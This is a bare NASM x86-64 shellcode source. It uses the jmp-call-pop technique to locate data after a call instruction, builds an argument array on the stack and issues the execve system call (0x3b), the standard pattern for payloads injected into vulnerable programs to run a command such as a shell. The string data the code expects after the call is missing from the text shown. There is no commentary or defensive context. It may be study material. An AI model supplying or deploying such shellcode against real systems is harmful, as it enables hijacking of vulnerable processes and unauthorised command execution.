BITS 64
jmp short jukebox
shellcode:
	pop    rdi
	mov    rbp, rsp
	push 0
	add rdi, 10
	push rdi
	sub rdi, 10
	push rdi
	xor    rax, rax
	xor    rdx, rdx
	mov    al, 0x3b
	mov    rdi, qword [rsp]
	mov    rsi, rsp
	syscall
jukebox:
	call shellcode
